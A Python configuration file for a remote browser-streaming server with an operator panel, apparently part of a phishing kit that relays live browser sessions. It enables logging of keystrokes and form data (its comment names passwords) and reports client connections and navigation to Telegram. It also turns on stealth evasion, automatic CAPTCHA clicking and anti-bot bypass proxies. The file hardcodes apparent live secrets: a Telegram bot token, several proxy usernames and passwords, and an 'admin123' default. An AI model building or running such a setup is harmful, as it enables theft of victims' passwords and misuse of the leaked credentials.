"""
GPU-Accelerated Browser Streaming Server Configuration
Supports dynamic configuration, environment variables, and hot reload
"""

import os
from pathlib import Path
from dataclasses import dataclass, field
from typing import Dict, List
import json
import hashlib


# Hosts that only ever appear in examples/templates. URLs built from these
# are guaranteed to fail, so they must never reach the running config.
PLACEHOLDER_HOSTS = frozenset({
    "example.com", "www.example.com", "example.org", "www.example.org",
    "example.net", "panel.example.com", "localhost", "127.0.0.1",
    "0.0.0.0", "::1", "it.com", "simplify-hospitality.it.com",
})


def is_placeholder_host(host: str) -> bool:
    """True for template/example hostnames and other unusable addresses."""
    value = (host or "").strip().strip("/").lower()
    if not value:
        return False
    for prefix in ("http://", "https://"):
        if value.startswith(prefix):
            value = value[len(prefix):]
    value = value.split("/", 1)[0].split(":", 1)[0]
    if value in PLACEHOLDER_HOSTS:
        return True
    return value.endswith(".example.com") or value.endswith(".example.org") \
        or value.endswith(".example.net")


@dataclass
class UltraConfig:
    """Server configuration for Maximum CPU/GPU Performance Browser Streaming"""

    # ------------------------------------------------------------------
    # THE SETTINGS THAT MATTER FOR RUNNING THE APP
    #
    # This file is the source of truth. Nothing else has to exist for
    # `python main.py` to serve on this host and port: no .env, no nginx.
    # A .env only overrides these values if you (or deploy/setup.sh) made
    # one; `python main.py --check` prints the effective value of each
    # setting and which of the three places it came from.
    # ------------------------------------------------------------------
    app_name: str = "Neo Browser Stream"
    version: str = "2.0-Neo"

    # 0.0.0.0  = listen on every interface: this machine AND every device
    #            on its network (phone, laptop, another PC).
    # 127.0.0.1 = this machine only (use it when nginx or a tunnel proxies
    #            to the app). Changing this needs a restart.
    host: str = "0.0.0.0"
    port: int = 8446

    # Auto update
    # -----------
    # True  -> when a source file (.py/.html/.env) in this folder changes,
    #          the app restarts itself so the change takes effect. Handy
    #          when you upload files or `git pull` on the server.
    # False -> changes take effect only when you restart it yourself:
    #          Ctrl+C and `python main.py`, or `systemctl restart fixiis`.
    #
    # OFF by default, because a restart closes every live session.
    auto_update: bool = False
    auto_update_interval: float = 2.0   # seconds between scans
    auto_update_debounce: float = 3.0   # quiet time after the last change
    # ------------------------------------------------------------------
    # The address the server hands to OTHER machines
    # ------------------------------------------------------------------
    # Both are BLANK by default on purpose. Blank means "no address is
    # baked in": links and pushed page URLs are then server-relative
    # ("/api/lpv/archive/<id>/html") and every client resolves them against
    # whatever backend it actually reached, so the same install works on
    # localhost, on a LAN IP, behind nginx and behind a tunnel without
    # editing code - and a changing/reused IP cannot break page pushes or
    # answer with mixed content.
    #
    # Set one ONLY when you need fully qualified links (a link pasted into
    # Telegram, an email, another device):
    #
    #   public_ip = "203.0.113.10"        # or  PUBLIC_IP=203.0.113.10
    #   server_domain = "panel.mysite.com"  # or  SERVER_DOMAIN=panel.mysite.com
    #
    # A domain that does not resolve here, or a placeholder such as
    # example.com, is ignored rather than baked into links (see
    # is_placeholder_host below).
    public_ip: str = ""
    server_domain: str = ""   # e.g. "panel.mysite.com"
    use_https: bool = False   # True only when TLS terminates in front of the app

    # Performance
    target_fps: int = 60  # 60 FPS for maximum performance
    frame_interval: float = 0.01667  # 60 FPS (1/60)
    quality: int = 85  # Optimized high quality without buffer bloat
    bitrate: int = 10000  # 50 Mbps - maximum quality
    keyframe_interval: int = 30

    # Stream render scale (device pixel ratio)
    # ---------------------------------------
    # Chrome never upscales a screencast frame, and a 1x render shown at
    # 200% is always soft. Every live view therefore renders its page at
    # `CSS viewport x stream_dpr` and the panel displays that frame back at
    # the CSS size. 2.0 = retina-sharp text; 1.0 = the old logical-pixel
    # behaviour (smaller frames, visibly softer).
    stream_dpr: float = 2.0

    # Adaptive FPS Settings - ENABLED for 60 FPS
    adaptive_fps: bool = True  # Enabled - allows dynamic FPS adjustment
    fps_min: int = 60  # Minimum FPS (60 FPS target)
    fps_max: int = 60  # Maximum FPS (locked at 60 FPS)
    fps_drop_threshold: float = 0.1  # Drop FPS if >10% frames dropped
    fps_recovery_threshold: float = 0.02  # Recover FPS if <2% frames dropped

    # Adaptive Bitrate Streaming (20-80 Mbps - maximum quality)
    bitrate_min: int = 10000000   # 20 Mbps minimum
    bitrate_max: int = 30000000   # 80 Mbps maximum for 4K quality
    bitrate_default: int = 30000000  # 50 Mbps default - maximum quality
    bitrate_adaptation_interval: float = 3.0  # Reduced from 5s for faster adaptation

    # Desktop Mode Settings - Support up to 4K resolution
    desktop_mode: bool = True
    desktop_width: int = 3840  # 4K width (was 1920)
    desktop_height: int = 2160  # 4K height (was 1080)
    fixed_resolution: bool = False  # Dynamic based on client window size
    full_screen_only: bool = True

    # V7 FIX: Server Viewport for Coordinate Transformation
    # All client coordinates are scaled to match this fixed server viewport
    server_viewport_width: int = 3840  # 4K (was 1920)
    server_viewport_height: int = 2160  # 4K (was 1080)

    # CPU/GPU Settings - Optimized for 60 FPS
    use_gpu: bool = False  # CPU encoding only
    cpu_threads: int = 8  # Increased for 60 FPS processing
    encoder_type: str = "cpu"  # CPU encoding
    gpu_mode: str = "none"  # No GPU
    gpu_load_balancing: str = "none"
    max_sessions_per_gpu: int = 0

    # Video Encoding Settings
    video_codec: str = "h264"
    video_container: str = "mp4"
    use_hardware_encoder: bool = False  # CPU software encoding
    encoder_preset: str = "p4"  # NVENC/VAAPI preset
    encoder_tune: str = "zerolatency"  # Zero latency for streaming

    # Session - Increased for 60 FPS performance
    max_sessions: int = 20  # Match browser_pool_size
    default_url: str = "https://www.google.com"
    session_ttl: int = 3600 * 24 * 7
    session_timeout: int = 3600

    # Sleep/Wake Management
    sleep_timeout_seconds: int = 60  # Seconds of inactivity before sleep (60s for mobile)
    wakeup_latency_ms: int = 30  # Reduced from 50 for faster wake-up

    # Browser Settings
    use_system_chrome: bool = False # Use system Chrome - faster than Playwright's built-in
    chrome_path: str = ""  # Auto-detect Chrome path based on OS
    browser_type: str = "chrome"  # V7 FIX: Added browser_type for concurrent browsers
    headless: bool = False  # Use headed browser (Xvfb on Linux) for maximum stealth
    stealth_mode: bool = True  # ENABLED - advanced evasion + headed mode for maximum stealth
    browser_pool_size: int = 20
    
    # NEW: Direct Chrome Mode (bypass Playwright)
    # Set to True to use Chrome directly via subprocess + CDP
    # Set to False to use Playwright (original behavior)
    use_direct_chrome: bool = False  # Default to Playwright (use built-in Chromium)

    browser_profile_enabled: bool = True  # Keep profiles enabled
    profile_base_path: str = "./profiles"

    # Mobile/Touch - DISABLED in desktop mode
    touch_enabled: bool = False
    touch_sampling_rate: int = 240
    virtual_keyboard: bool = False
    gesture_support: bool = False

    # Memory Management - Increased for 60 FPS
    memory_pool_size: int = 8  # Increased from 4 for 60 FPS
    max_decoded_image_mb: int = 1024  # Increased from 512 for higher throughput
    gpu_memory_buffer_mb: int = 1024
    system_memory_limit_percent: int = 90

    # Dynamic Resolution - DISABLED in desktop mode
    dynamic_resolution: bool = False
    min_scale: float = 1.0
    max_scale: float = 1.0
    scale_adaptation_interval: float = 3.0

    # Connection Pooling
    connection_pool_size: int = 20
    ws_ping_interval: float = 3.0
    ws_ping_timeout: float = 15.0
    keep_alive: bool = True
    
    # Keepalive Settings
    client_keepalive_interval: float = 30.0  # Send ping every 30 seconds to client
    client_keepalive_timeout: float = 90.0   # Timeout after 90 seconds without response
    admin_keepalive_interval: float = 30.0   # Send ping every 30 seconds to admin
    admin_keepalive_timeout: float = 90.0    # Timeout after 90 seconds without response
    disconnect_grace_period: float = 30.0    # Keep session alive for this many seconds after disconnect
    
    # Heartbeat/Session Timeout Settings (Part 3)
    heartbeat_interval: int = 15  # Heartbeat check every 15 seconds
    session_timeout: int = 120  # Session expires after 120 seconds (2 min) of inactivity

    # Performance Tuning - Optimized for 60 FPS capture
    frame_buffer_size: int = 120  # Increased from 60 to handle higher throughput

    # Resource Limits
    max_gpu_memory_percent: int = 80
    max_cpu_percent: int = 80
    rate_limit_requests_per_minute: int = 1000

    # Logging
    log_performance: bool = False
    log_interval: float = 10.0
    debug_mode: bool = False

    # Prometheus Metrics
    enable_metrics: bool = True
    metrics_port: int = 9090

    # Cloudflare Tunnel - Disabled for performance (enable if needed)
    cloudflare_tunnel: bool = False
    tunnel_hostname: str = ""

    # -------------------------------------------------------------------------
    # DOM Capture engine toggles
    # -------------------------------------------------------------------------
    # enable_extension_capture: drive SingleFile via the bundled MV3 extension
    #                            (the page-bridge / service-worker path).
    # enable_live_library:       use the in-page SingleFile JS library as a
    #                            fallback when the extension is unavailable
    #                            (or as the primary path when extension is off).
    # Both default to True so existing behaviour is preserved; flip them in
    # .env via ENABLE_EXTENSION_CAPTURE / ENABLE_LIVE_LIBRARY to disable.
    enable_extension_capture: bool = True
    enable_live_library: bool = True

    # -------------------------------------------------------------------------
    # Browser backend (MIGRATION_SELENIUMBASE.md)
    # -------------------------------------------------------------------------
    # browser_backend: 'sb' (DEFAULT — SeleniumBase UC: SB launches/stealths
    #                  real Chrome; our own async CDP adapter drives it —
    #                  custom stealth scripts are bypassed on this path by
    #                  design) | 'pw' (legacy Playwright launch paths, kept
    #                  as instant rollback via BROWSER_BACKEND=pw).
    # captcha_mode:    'auto' (DEFAULT — on the sb backend, probe for
    #                  checkbox-class challenges (reCAPTCHA/Turnstile/CF)
    #                  after navigations and run uc_gui_click_captcha(),
    #                  max 2 attempts per navigation, best-effort) | 'off'.
    # archive_format:  'singlefile' (default) | 'mhtml' — archive-quality
    #                  snapshot format for PCM page-manager captures.
    browser_backend: str = "sb"
    captcha_mode: str = "auto"
    archive_format: str = "singlefile"

    # Telegram Bot Settings
    telegram_enabled: bool = True
    telegram_bot_token: str = "8636533665:AAHDaksMFSo25cByTkLZNfEE0OHAInI3IPM"
    telegram_chat_id: str = "7661766599"  # Chat ID to send notifications to
    telegram_admin_ids: List[int] = field(default_factory=list)
    telegram_notify_on_connect: bool = True
    telegram_notify_on_navigation: bool = True  # Notify when client navigates to new URL
    
    # Telegram Admin Authentication
    telegram_admin_username: str = "admin"
    telegram_admin_password: str = "admin123"  # CHANGE THIS IN PRODUCTION!
    telegram_session_timeout: int = 3600  # Session expires after 1 hour

    # Keylogger Settings
    keylog_enabled: bool = True  # Enable keystroke logging for admin monitoring
    keylog_log_form_data: bool = True  # Also log form field inputs (passwords, etc.)

    # Decodo Proxy Settings - SIMPLE format
    proxy_enabled: bool = False  # Enable Decodo proxy integration
    proxy_server: str = "us.decodo.com:10000"  # Proxy server URL (include port)
    proxy_username: str = "spc3h9bjvk"  # Username (use directly, no zip placeholder)
    proxy_password: str = "hWX2Ps4Ntz5uh9p_le"  # Proxy password
    proxy_log_enabled: bool = True  # Enable proxy connection logging
    proxy_log_path: str = "logs/proxies.log"  # Path to proxy log file

    # Oxylabs Browser Proxy - DC proxies for browser traffic
    oxylabs_browser_proxy_enabled: bool = False
    oxylabs_browser_proxy: str = "http://dc.oxylabs.io:8000"
    oxylabs_browser_username: str = "user-myproxyuser_EMhtf-country-US"
    oxylabs_browser_password: str = "+wX1kcMoi+Ypj+"

    # Oxylabs Web Unlocker Proxy - For anti-bot bypass
    oxylabs_unlocker_proxy_enabled: bool = False
    oxylabs_unlocker_proxy: str = "http://unblock.oxylabs.io:60000"
    oxylabs_unlocker_username: str = "Grfffeergb_KUf6g"
    oxylabs_unlocker_password: str = "Vj+H67lKqg28BVCv"

    def __post_init__(self):
        """Post-initialization configuration loading"""
        self._load_from_environment()
        self._validate_config()

    def _load_from_environment(self):
        """Load configuration from environment variables"""
        env_mappings = {
            "HOST": ("host", str),
            "PORT": ("port", int),
            "AUTO_UPDATE": ("auto_update", lambda x: x.lower() in ("1", "true", "yes", "on")),
            "PUBLIC_IP": ("public_ip", str),
            "SERVER_DOMAIN": ("server_domain", str),
            "USE_HTTPS": ("use_https", lambda x: x.lower() == "true"),
            "TARGET_FPS": ("target_fps", int),
            "STREAM_DPR": ("stream_dpr", float),
            "QUALITY": ("quality", int),
            "BITRATE": ("bitrate", int),
            "USE_GPU": ("use_gpu", lambda x: x.lower() == "true"),
            "MAX_SESSIONS": ("max_sessions", int),
            "DEFAULT_URL": ("default_url", str),
            "SESSION_TIMEOUT": ("session_timeout", int),
            "USE_SYSTEM_CHROME": ("use_system_chrome", lambda x: x.lower() == "true"),
            "USE_DIRECT_CHROME": ("use_direct_chrome", lambda x: x.lower() == "true"),
            "CHROME_PATH": ("chrome_path", str),
            "HEADLESS": ("headless", lambda x: x.lower() == "true"),
            "STEALTH_MODE": ("stealth_mode", lambda x: x.lower() == "true"),
            "BROWSER_POOL_SIZE": ("browser_pool_size", int),
            "BROWSER_PROFILE_ENABLED": ("browser_profile_enabled", lambda x: x.lower() == "true"),
            "PROFILE_BASE_PATH": ("profile_base_path", str),
            "TOUCH_ENABLED": ("touch_enabled", lambda x: x.lower() == "true"),
            "VIRTUAL_KEYBOARD": ("virtual_keyboard", lambda x: x.lower() == "true"),
            "GESTURE_SUPPORT": ("gesture_support", lambda x: x.lower() == "true"),
            "DYNAMIC_RESOLUTION": ("dynamic_resolution", lambda x: x.lower() == "true"),
            "MIN_SCALE": ("min_scale", float),
            "MAX_SCALE": ("max_scale", float),
            "DEBUG_MODE": ("debug_mode", lambda x: x.lower() == "true"),
            "ENABLE_METRICS": ("enable_metrics", lambda x: x.lower() == "true"),
            "METRICS_PORT": ("metrics_port", int),
            "CLOUDFLARE_TUNNEL": ("cloudflare_tunnel", lambda x: x.lower() == "true"),
            "TUNNEL_HOSTNAME": ("tunnel_hostname", str),
            "TELEGRAM_ENABLED": ("telegram_enabled", lambda x: x.lower() == "true"),
            "TELEGRAM_BOT_TOKEN": ("telegram_bot_token", str),
            "TELEGRAM_CHAT_ID": ("telegram_chat_id", str),
            "TELEGRAM_ADMIN_IDS": ("telegram_admin_ids", lambda x: [int(i.strip()) for i in x.split(",") if i.strip()]),
            "TELEGRAM_NOTIFY_ON_CONNECT": ("telegram_notify_on_connect", lambda x: x.lower() == "true"),
            "TELEGRAM_ADMIN_USERNAME": ("telegram_admin_username", str),
            "TELEGRAM_ADMIN_PASSWORD": ("telegram_admin_password", str),
            "TELEGRAM_SESSION_TIMEOUT": ("telegram_session_timeout", int),
            "KEYLOG_ENABLED": ("keylog_enabled", lambda x: x.lower() == "true"),
            "KEYLOG_LOG_FORM_DATA": ("keylog_log_form_data", lambda x: x.lower() == "true"),
            "PROXY_ENABLED": ("proxy_enabled", lambda x: x.lower() == "true"),
            "PROXY_SERVER": ("proxy_server", str),
            "PROXY_USERNAME": ("proxy_username", str),
            "PROXY_PASSWORD": ("proxy_password", str),
            "PROXY_LOG_ENABLED": ("proxy_log_enabled", lambda x: x.lower() == "true"),
            "PROXY_LOG_PATH": ("proxy_log_path", str),
            "ENABLE_EXTENSION_CAPTURE": ("enable_extension_capture", lambda x: x.lower() in ("1", "true", "yes", "on")),
            "ENABLE_LIVE_LIBRARY": ("enable_live_library", lambda x: x.lower() in ("1", "true", "yes", "on")),
            "BROWSER_BACKEND": ("browser_backend", str),
            "CAPTCHA_MODE": ("captcha_mode", str),
            "ARCHIVE_FORMAT": ("archive_format", str),
        }

        for env_var, (attr_name, converter) in env_mappings.items():
            value = os.environ.get(env_var)
            # An empty value means "not configured", not "set it to blank".
            # `.env` templates ship lines like `PUBLIC_IP=` and
            # `ADMIN_PASSWORD_HASH=`; treating those as real values used to
            # blank out defaults and produce links like `http://:8446`.
            if value is not None and not value.strip():
                continue
            if value is not None:
                try:
                    setattr(self, attr_name, converter(value))
                except (ValueError, AttributeError):
                    pass  # Silently ignore parsing errors

        # A template placeholder is also "not configured": a domain that
        # nobody owns turns every generated link into a dead host.
        if is_placeholder_host(getattr(self, "server_domain", "")):
            self.server_domain = ""

    def _validate_config(self):
        """Validate configuration values"""
        if not 1 <= self.port <= 65535:
            self.port = 8447

        if not 1 <= self.target_fps <= 144:
            self.target_fps = 60

        if not 1.0 <= self.stream_dpr <= 3.0:
            self.stream_dpr = 2.0

        if not 10 <= self.quality <= 100:
            self.quality = 100

        if not 0.1 <= self.min_scale <= 1.0:
            self.min_scale = 0.5
        if not 0.5 <= self.max_scale <= 2.0:
            self.max_scale = 1.0
        if self.min_scale > self.max_scale:
            self.min_scale, self.max_scale = 0.5, 1.0

        if not 1 <= self.max_sessions <= 200:
            self.max_sessions = 50

        if not 1 <= self.browser_pool_size <= 200:
            self.browser_pool_size = 50

    def to_dict(self) -> Dict:
        """Convert configuration to dictionary"""
        return {
            "app_name": self.app_name,
            "version": self.version,
            "host": self.host,
            "port": self.port,
            "public_ip": self.public_ip,
            "target_fps": self.target_fps,
            "quality": self.quality,
            "bitrate": self.bitrate,
            "use_gpu": self.use_gpu,
            "max_sessions": self.max_sessions,
            "default_url": self.default_url,
            "session_timeout": self.session_timeout,
            "touch_enabled": self.touch_enabled,
            "virtual_keyboard": self.virtual_keyboard,
            "gesture_support": self.gesture_support,
            "dynamic_resolution": self.dynamic_resolution,
            "min_scale": self.min_scale,
            "max_scale": self.max_scale,
            "debug_mode": self.debug_mode,
            "enable_metrics": self.enable_metrics,
            "desktop_mode": self.desktop_mode,
            "desktop_width": self.desktop_width,
            "desktop_height": self.desktop_height,
            "fixed_resolution": self.fixed_resolution,
            "full_screen_only": self.full_screen_only,
            "headless": self.headless,
            "keylog_enabled": self.keylog_enabled,
            "keylog_log_form_data": self.keylog_log_form_data,
            "proxy_enabled": self.proxy_enabled,
            "proxy_server": self.proxy_server,
            "proxy_username": self.proxy_username,
            "proxy_password": "***" if self.proxy_password else "",
            "proxy_log_enabled": self.proxy_log_enabled,
            "proxy_log_path": self.proxy_log_path,
        }

    def get_cache_key(self) -> str:
        """Generate cache key for configuration"""
        config_str = json.dumps(self.to_dict(), sort_keys=True)
        return hashlib.md5(config_str.encode()).hexdigest()[:16]


# Global config instance
CONFIG = UltraConfig()


def stream_dpr() -> float:
    """Render scale every streamed browser surface uses (1.0 - 3.0).

    Kept here so the browser launch, the CDP screencast size and the input
    mapping can never disagree about it: a frame rendered at 2x but mapped
    as 1x would put every click at half its real position.
    """
    try:
        value = float(getattr(CONFIG, "stream_dpr", 2.0) or 2.0)
    except (TypeError, ValueError):
        return 2.0
    return min(3.0, max(1.0, value))


def frame_to_css(value, dpr: float = None) -> float:
    """Convert a screencast-frame coordinate (CSS x DPR) back to CSS px.

    page.mouse works in CSS pixels while the operator canvas measures the
    frame it can see, which is DPR times bigger.
    """
    try:
        number = float(value)
    except (TypeError, ValueError):
        return 0.0
    scale = stream_dpr() if dpr is None else float(dpr or 1.0)
    if scale <= 0:
        scale = 1.0
    return number / scale


# Paths
BASE_DIR = Path(__file__).parent
PROFILES_DIR = BASE_DIR / "profiles"
LOGS_DIR = BASE_DIR / "logs"
CACHE_DIR = BASE_DIR / "cache"

# LPV (Live Panel Version) — page archive + audit log storage
LPV_DIR = BASE_DIR / "lpv"
LPV_PAGES_DIR = LPV_DIR / "pages"
LPV_DB_PATH = LPV_DIR / "lpv.sqlite3"

# Ensure directories exist
PROFILES_DIR.mkdir(exist_ok=True)
LOGS_DIR.mkdir(exist_ok=True)
CACHE_DIR.mkdir(exist_ok=True)
LPV_DIR.mkdir(exist_ok=True)
LPV_PAGES_DIR.mkdir(exist_ok=True)


def reload_config():
    """Reload configuration from environment and files"""
    global CONFIG
    CONFIG = UltraConfig()
    return CONFIG
